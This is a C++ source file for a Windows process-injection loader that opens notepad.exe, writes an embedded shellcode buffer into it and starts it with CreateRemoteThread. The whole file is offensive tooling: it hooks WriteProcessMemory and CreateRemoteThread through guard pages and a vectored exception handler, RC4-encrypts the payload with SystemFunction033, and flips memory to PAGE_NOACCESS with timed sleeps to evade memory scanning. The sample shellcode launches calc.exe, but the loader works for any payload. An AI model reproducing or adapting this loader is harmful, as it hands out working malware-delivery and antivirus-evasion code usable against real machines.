#include <Windows.h>
#include <iostream>
#include <WtsApi32.h>
#include <stdio.h>

using namespace std;

typedef NTSTATUS(WINAPI* _SystemFunction033)(
    struct ustring* memoryRegion,
    struct ustring* keyPointer
);


struct ustring {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} _data, key, _data2;


bool SleepImplant(DWORD dwMilliseconds) {
    HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (hEvent == NULL) {
		return false;
	}
	HANDLE hTimer = NULL;
	LARGE_INTEGER liDueTime;
	liDueTime.QuadPart = -10000LL * dwMilliseconds;
	hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
    if (hTimer == NULL) {
		CloseHandle(hEvent);
		return false;
	}
    if (!SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, FALSE)) {
		CloseHandle(hEvent);
		CloseHandle(hTimer);
		return false;
	}
    if (WaitForSingleObject(hTimer, INFINITE) != WAIT_OBJECT_0) {
		CloseHandle(hEvent);
		CloseHandle(hTimer);
		return false;
	}
	CloseHandle(hEvent);
	CloseHandle(hTimer);
	return true;    
}

char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";



int getPidByProcName(const char* procname) {
    int pid = 0;
    WTS_PROCESS_INFOA* proc_info;
    DWORD pi_count = 0;

    if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &proc_info, &pi_count)) return 0;

    for (int i = 0; i < pi_count; i++) {
        if (lstrcmpiA(procname, proc_info[i].pProcessName) == 0) {
            pid = proc_info[i].ProcessId;
            break;
        }
    }

    return pid;
}

HANDLE hookedCreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    //MessageBoxA(0, "Hooked CreateRemoteThread", "YAY!", 0);
    DWORD old;

    SIZE_T bytesRead = 0;
    // Resolve SystemFunction033 address from advapi32.dll
    _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction033");

    // Arrives here encrypted and with PAGE_NOACCESS

    SleepImplant(9520);

    VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_READWRITE, &old);

    printf("Permisions changed to PAGE_READWRITE\n");

    // Decryption with SystemFuncion033
    // Error porque no se puede acceder a la memoria con SystemFunction033 de lpStartAddress ya que esta en un proceso remoto
    char _key[] = "1234567890123456";

    key.Buffer = (&_key);
    key.Length = sizeof(_key);
    _data2.Buffer = shellcode;
    _data2.Length = sizeof(shellcode);

    SystemFunction033(&_data2, &key);

    printf("Decrypted Shellcode address = %p\n", shellcode);

    WriteProcessMemory(hProcess, lpStartAddress, &shellcode, sizeof(shellcode), &bytesRead);
    printf("Shellcode written in the Address = %p\n", lpStartAddress);
        

    VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_NOACCESS, &old);

    SleepImplant(11120);

    VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_EXECUTE, &old);

    CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

    SleepImplant(9520);

    VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_READWRITE, &old);

    SystemFunction033(&_data2, &key);

    WriteProcessMemory(hProcess, lpStartAddress, &shellcode, sizeof(shellcode), &bytesRead);

    printf("Shellcode Encrypted written in the Address = %p\n", lpStartAddress);

    VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_NOACCESS, &old);
    printf("Permisions changed to PAGE_NOACCESS\n");

    VirtualProtect(&CreateRemoteThread, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
    return NULL;
}

HANDLE hookedWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) {
    HANDLE hMap;
    SIZE_T numberOfBytesWritten;
    DWORD old;
    LPVOID mapViewMemory;
    char name[] = "Local\\S12";
    char _key[] = "1234567890123456";

    // Resolve SystemFunction033 address from advapi32.dll 
    _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction033");

    //MessageBoxA(0, "Hooked WriteProcessMemory", "YAY!", 0);

    // Encryption with SystemFuncion033
    key.Buffer = (&_key);
    key.Length = sizeof(_key);

    _data.Buffer = (char*)lpBuffer;
    _data.Length = nSize;

    SystemFunction033(&_data, &key);
    printf("Encrypted Shellcode address = %p\n", _data.Buffer);

    WriteProcessMemory(hProcess, lpBaseAddress, _data.Buffer, nSize, &numberOfBytesWritten);
    cout << "Writted Shellcode with: " << numberOfBytesWritten << " bytes in the Process";


    VirtualProtectEx(hProcess, lpBaseAddress, 1, PAGE_NOACCESS, &old);

    SleepImplant(9520);

    return NULL;
}

LONG WINAPI exceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) {
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)&WriteProcessMemory) {
            cout << "RIP = " << ExceptionInfo->ContextRecord->Rip << endl;
            ExceptionInfo->ContextRecord->Rip = (DWORD64)&hookedWriteProcessMemory;

            cout << "Modified RIP Points to: " << ExceptionInfo->ContextRecord->Rip << " (Hook Function = " << (DWORD64)&hookedWriteProcessMemory << ")" << endl;
        }
        else if (ExceptionInfo->ContextRecord->Rip == (DWORD64)&CreateRemoteThread) {
            cout << "RIP = " << ExceptionInfo->ContextRecord->Rip << endl;
            ExceptionInfo->ContextRecord->Rip = (DWORD64)&hookedCreateRemoteThread;

            cout << "Modified RIP Points to: " << ExceptionInfo->ContextRecord->Rip << " (Hook Function = " << (DWORD64)&hookedCreateRemoteThread << ")" << endl;

        }
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}



int main(int argc, char* argv[]) {
    DWORD old = 0;
    PVOID hMemory;
    HANDLE hProcess;
    int pid;
    SIZE_T copiedBytes;

    AddVectoredExceptionHandler(1, &exceptionHandler);
    pid = getPidByProcName("notepad.exe");
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

    hMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE);
    cout << "Allocated Memory Space = " << hMemory << endl;

    printf("WriteProcessMemory Address: 0x%p\n", WriteProcessMemory);
    VirtualProtect(&WriteProcessMemory, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);

    printf("Shellcode Size: %d\n", sizeof(shellcode));

    WriteProcessMemory(hProcess, hMemory, &shellcode, sizeof(shellcode), &copiedBytes);

    cout << "WriteProcessMemory Guard Completed" << endl;

    VirtualProtect(&CreateRemoteThread, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
    printf("Setted as Page Guard  :  CreateRemoteThread Address: 0x%p\n", CreateRemoteThread);

    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hMemory, NULL, 0, NULL);

    return 0;
}